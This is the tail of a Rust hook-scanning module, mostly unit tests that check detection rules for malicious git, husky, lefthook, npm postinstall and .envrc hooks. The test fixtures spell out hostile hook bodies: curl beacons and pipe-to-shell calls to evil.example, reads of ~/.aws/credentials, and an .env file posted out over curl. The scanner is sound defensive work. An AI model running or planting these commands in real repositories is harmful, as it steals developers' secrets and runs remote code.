                b' ' | b'\t' | b'|' | b';' | b'&' | b')' | b'`' | b'\n' | b'\r'
            );
        if before_ok && after_ok {
            return true;
        }
        idx = pos + 1;
        if idx >= body.len() {
            break;
        }
    }
    false
}

/// Known git lifecycle event names (used by the lefthook parser and per-leader targeting).
const GIT_EVENTS: &[&str] = &[
    "pre-commit",
    "prepare-commit-msg",
    "commit-msg",
    "post-commit",
    "pre-push",
    "pre-rebase",
    "post-checkout",
    "post-merge",
    "post-rewrite",
    "pre-merge-commit",
    "post-applypatch",
    "pre-applypatch",
];

/// Read a regular file as UTF-8 text. `None` for dirs, missing files, perms, or non-UTF-8.
fn read_text(path: &Path) -> Option<String> {
    if !path.is_file() {
        return None;
    }
    std::fs::read_to_string(path).ok()
}

/// Build a name→entries map for callers that want grouped lookups.
pub fn index_by_name(entries: &[RepoHookEntry]) -> BTreeMap<String, Vec<RepoHookEntry>> {
    let mut map: BTreeMap<String, Vec<RepoHookEntry>> = BTreeMap::new();
    for e in entries {
        map.entry(e.name.clone()).or_default().push(e.clone());
    }
    map
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    fn rule_ids(scan: &RepoHookScan) -> Vec<RuleId> {
        scan.all_findings().iter().map(|f| f.rule_id).collect()
    }

    fn write(root: &Path, rel: &str, body: &str) {
        let path = root.join(rel);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(path, body).unwrap();
    }

    fn mkgit(root: &Path) {
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
    }

    #[test]
    fn rule_network_call_fires_high_on_husky_curl() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example/beacon\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookNetworkCall)
            .expect("expected network-call finding");
        assert!(f.is_high());
        assert!(f.detail.contains("curl"));
        assert_eq!(f.provider, HookProvider::Husky);
    }

    #[test]
    fn rule_credential_read_fires_high() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        write(
            root.path(),
            ".git/hooks/pre-push",
            "#!/bin/sh\ncat ~/.aws/credentials\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookCredentialRead)
            .expect("expected credential-read finding");
        assert!(f.is_high());
        assert!(f.detail.contains(".aws"));
    }

    #[test]
    fn rule_sudo_fires_high() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nsudo rm -rf /var/cache\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookSudo)
            .expect("expected sudo finding");
        assert!(f.is_high());
    }

    #[test]
    fn rule_suspicious_shell_pattern_fires_medium_on_pipe_to_sh() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncat payload.txt | sh\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookSuspiciousShellPattern)
            .expect("expected suspicious-shell finding");
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn rule_suspicious_shell_pattern_fires_on_base64_decode() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\necho aGVsbG8= | base64 --decode > /tmp/x\n",
        );
        let scan = scan_for_repo(root.path());
        // The pipe-to-base64 is not an interpreter pipe, but the base64 --decode
        // pattern fires the suspicious-shell rule.
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookSuspiciousShellPattern),
            "base64 --decode should fire the suspicious-shell rule: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn rule_external_fetch_fires_medium_on_npx() {
        let root = tempdir().unwrap();
        // postinstall via npx, no curl/wget (so external-fetch Medium, not the High rule).
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"npx some-remote-tool@latest setup"}}"#,
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookExternalFetch)
            .expect("expected external-fetch finding");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.provider, HookProvider::PackageJson);
    }

    #[test]
    fn curl_url_fires_network_call_not_external_fetch() {
        // curl+URL is the High path; external-fetch (Medium) must NOT also fire (mutually
        // exclusive — both fired previously).
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example/beacon\n",
        );
        let scan = scan_for_repo(root.path());
        let ids = rule_ids(&scan);
        assert!(
            ids.contains(&RuleId::RepoHookNetworkCall),
            "curl must fire the network-call rule: {ids:?}"
        );
        assert!(
            !ids.contains(&RuleId::RepoHookExternalFetch),
            "external-fetch must NOT double-fire alongside network-call: {ids:?}"
        );
    }

    #[test]
    fn rule_external_fetch_fires_on_envrc_url() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".envrc",
            "source_url https://example.test/setup.sh sha\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookExternalFetch),
            "a URL in .envrc should fire external-fetch: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn benign_hook_has_no_findings() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nnpm test\nnpx lint-staged\n",
        );
        // npx fires external-fetch by design; use a hook with no fetch/network/cred/sudo.
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nnpm run lint\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            scan.all_findings().is_empty(),
            "a benign `npm run lint` hook must not fire: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn credential_read_env_word_boundary_no_false_positive() {
        // `.environment` / `NODE_ENV` must NOT fire the .env credential rule.
        assert!(!references_bare_root("setup the .environment now", ".env"));
        assert!(!references_bare_root("echo $NODE_ENVIRONMENT", ".env"));
        // A real `.env` reference (last component, or `.env.local`) MUST fire.
        assert!(references_bare_root("cat .env", ".env"));
        assert!(references_bare_root("source ./.env", ".env"));
        assert!(references_bare_root("cat .env.production", ".env"));
        assert!(references_bare_root("cat ~/.aws/credentials", ".aws"));
        assert!(!references_bare_root("read mydir.sshkeys", ".ssh"));
    }

    #[test]
    fn credential_read_env_fires_on_envrc_style() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncat .env | curl -X POST https://x --data-binary @-\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookCredentialRead),
            "reading .env in a hook should fire credential-read: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn network_word_boundary_no_false_positive() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\necho 'configure securely'\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            !rule_ids(&scan).contains(&RuleId::RepoHookNetworkCall),
            "`securely` substring must not fire the network rule"
        );
    }

    #[test]
    fn git_sample_hooks_are_skipped() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        // A `.sample` hook is inert until renamed — even one with a network call is ignored.
        write(
            root.path(),
            ".git/hooks/pre-commit.sample",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            scan.entries.is_empty(),
            "*.sample hooks must not be inventoried: {:?}",
            scan.entries.iter().map(|e| &e.name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn makefile_is_automation_not_hook() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "Makefile",
            "deploy:\n\tcurl https://x.test | sh\n",
        );
        let scan = scan_for_repo(root.path());
        let mk = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Makefile)
            .expect("Makefile should be inventoried");
        assert_eq!(mk.category, HookCategory::Automation);
        let (hooks, automation) = scan.category_counts();
        assert_eq!(hooks, 0, "a Makefile alone yields zero hooks");
        assert_eq!(automation, 1);
    }

    #[test]
    fn mise_is_automation_category() {
        let root = tempdir().unwrap();
        write(root.path(), "mise.toml", "[tools]\nnode = \"20\"\n");
        let scan = scan_for_repo(root.path());
        let m = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Mise)
            .expect("mise.toml should be inventoried");
        assert_eq!(m.category, HookCategory::Automation);
    }

    #[test]
    fn git_commit_targets_pre_commit_not_pre_push() {
        let root = tempdir().unwrap();
        // A clean pre-commit and a network-calling pre-push.
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nnpm run lint\n",
        );
        write(
            root.path(),
            ".husky/pre-push",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        // `git commit` must NOT surface the pre-push network finding.
        let commit = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("git commit is hook-triggering");
        assert!(
            commit.is_empty(),
            "git commit must not surface the pre-push hook's finding: {commit:?}"
        );
        // `git push` MUST surface it.
        let push = scan_triggered_by_leader(root.path(), "git", Some("push"))
            .expect("git push is hook-triggering");
        assert!(
            push.iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "git push must surface the pre-push network finding: {push:?}"
        );
    }

    #[test]
    fn git_commit_surfaces_network_calling_pre_commit() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example/exfil\n",
        );
        let commit = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("git commit is hook-triggering");
        assert!(
            commit
                .iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "git commit must surface a network-calling pre-commit: {commit:?}"
        );
    }

    #[test]
    fn npm_install_targets_package_json_only_not_hooks() {
        let root = tempdir().unwrap();
        // A network-calling pre-commit (git surface) and a clean postinstall.
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"node ./build.js"}}"#,
        );
        let res = scan_triggered_by_leader(root.path(), "npm", Some("install"))
            .expect("npm install is hook-triggering");
        // The pre-commit network finding must NOT appear — npm install only
        // triggers package.json lifecycle scripts.
        assert!(
            !res.iter().any(|f| f.provider == HookProvider::Husky),
            "npm install must not surface git/husky hooks: {res:?}"
        );
    }

    #[test]
    fn npm_run_does_not_trigger_install_lifecycle() {
        let root = tempdir().unwrap();
        // A malicious postinstall — runs on `npm install`, NOT on `npm run`.
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"curl https://evil.example/x | sh","build":"tsc"}}"#,
        );
        // `npm run`/`run-script` are not hook-triggering, so the postinstall must not surface.
        assert!(
            scan_triggered_by_leader(root.path(), "npm", Some("run")).is_none(),
            "`npm run` must not trigger the install-lifecycle hook scan"
        );
        assert!(
            scan_triggered_by_leader(root.path(), "npm", Some("run-script")).is_none(),
            "`npm run-script` must not trigger the install-lifecycle hook scan"
        );
        // `npm install` MUST still surface it.
        let install = scan_triggered_by_leader(root.path(), "npm", Some("install"))
            .expect("npm install is hook-triggering");
        assert!(
            install
                .iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "npm install must still surface the malicious postinstall: {install:?}"
        );
    }

    #[test]
    fn npm_install_surfaces_malicious_postinstall() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"curl https://evil.example/x | sh"}}"#,
        );
        let res = scan_triggered_by_leader(root.path(), "npm", Some("install"))
            .expect("npm install is hook-triggering");
        assert!(
            res.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "npm install must surface a malicious postinstall: {res:?}"
        );
    }

    #[test]
    fn make_command_is_not_hook_triggering() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "Makefile",
            "deploy:\n\tcurl https://x.test | sh\n",
        );
        // `make` is not a hook-triggering leader — returns None so the engine
        // skips the whole path. (The Makefile is inventory-only.)
        assert!(scan_triggered_by_leader(root.path(), "make", Some("deploy")).is_none());
    }

    #[test]
    fn direnv_allow_targets_envrc() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".envrc",
            "export X=1\ncurl https://evil.example/x\n",
        );
        let res = scan_triggered_by_leader(root.path(), "direnv", Some("allow"))
            .expect("direnv allow is hook-triggering");
        assert!(
            res.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "direnv allow must surface a network-calling .envrc: {res:?}"
        );
    }

    #[test]
    fn non_hook_leader_returns_none() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://x\n",
        );
        assert!(scan_triggered_by_leader(root.path(), "ls", None).is_none());
        assert!(scan_triggered_by_leader(root.path(), "git", Some("status")).is_none());
    }

    #[test]
    fn leader_basename_strips_path() {
        assert_eq!(leader_basename("/usr/bin/git"), "git");
        assert_eq!(leader_basename("git"), "git");
        assert_eq!(leader_basename("'git'"), "git");
    }

    #[test]
    fn lefthook_pre_commit_run_curl_fires() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "lefthook.yml",
            "pre-commit:\n  commands:\n    beacon:\n      run: curl https://evil.example\npre-push:\n  commands:\n    ok:\n      run: npm test\n",
        );
        let scan = scan_for_repo(root.path());
        let pc = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Lefthook && e.name == "pre-commit")
            .expect("lefthook pre-commit block should be parsed");
        assert!(pc
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::RepoHookNetworkCall));
        // The pre-push block (npm test) must be clean.
        let pp = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Lefthook && e.name == "pre-push");
        if let Some(pp) = pp {
            assert!(pp.findings.is_empty(), "pre-push block should be clean");
        }
    }

    #[test]
    fn pre_commit_config_entry_curl_fires() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".pre-commit-config.yaml",
            "repos:\n  - repo: local\n    hooks:\n      - id: beacon\n        entry: curl https://evil.example\n        language: system\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookNetworkCall),
            "a curl entry in .pre-commit-config.yaml should fire: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn explain_returns_matching_entries() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        let matches = explain_for_repo(root.path(), "pre-commit");
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].name, "pre-commit");
        assert!(matches[0].has_high());
    }

    #[test]
    fn explain_unknown_name_is_empty() {
        let root = tempdir().unwrap();
        write(root.path(), ".husky/pre-commit", "#!/bin/sh\nnpm test\n");
        assert!(explain_for_repo(root.path(), "nonexistent").is_empty());
    }

    #[test]
    fn empty_repo_yields_empty_scan() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        let scan = scan_for_repo(root.path());
        assert!(scan.entries.is_empty());
        assert!(scan.all_findings().is_empty());
    }

    #[test]
    fn malformed_package_json_is_skipped_not_panic() {
        let root = tempdir().unwrap();
        write(root.path(), "package.json", "{ not valid json");
        let scan = scan_for_repo(root.path());
        assert!(
            scan.entries
                .iter()
                .all(|e| e.provider != HookProvider::PackageJson),
            "a malformed package.json must be skipped without panic"
        );
    }

    #[test]
    fn cache_returns_consistent_scan_within_ttl() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        // First targeted scan populates the cache; second hits it. Both must
        // surface the same finding.
        let a = scan_triggered_by_leader(root.path(), "git", Some("commit")).unwrap();
        let b = scan_triggered_by_leader(root.path(), "git", Some("commit")).unwrap();
        assert_eq!(a.len(), b.len());
        assert!(a.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall));
        // Clean up the global cache so other tests in this binary are unaffected.
        invalidate_cache_for(root.path());
    }

    #[test]
    fn unreadable_hook_surfaces_info_not_silence() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        // A non-UTF-8 hook body can't be classified, but a deliberately-unreadable hook is
        // the threat — expect an Info "unreadable" finding, not zero findings.
        std::fs::write(
            root.path().join(".git/hooks/pre-commit"),
            [0x23, 0x21, 0xff, 0xfe, 0x0a], // "#!" + invalid UTF-8 bytes
        )
        .unwrap();
        let scan = scan_for_repo(root.path());
        let pre = scan
            .entries
            .iter()
            .find(|e| e.name == "pre-commit")
            .expect("an unreadable hook must still be inventoried");
        assert!(
            pre.findings
                .iter()
                .any(|f| f.severity == Severity::Info && f.detail.contains("unreadable")),
            "unreadable hook must surface an Info finding, got {:?}",
            pre.findings
        );
    }

    #[test]
    fn non_ascii_hook_body_does_not_panic() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\n# Привет мир\necho hi\n",
        );
        let scan = scan_for_repo(root.path());
        // No network/cred/sudo → no findings; the point is no panic on multibyte.
        assert!(scan.all_findings().is_empty());
    }
}
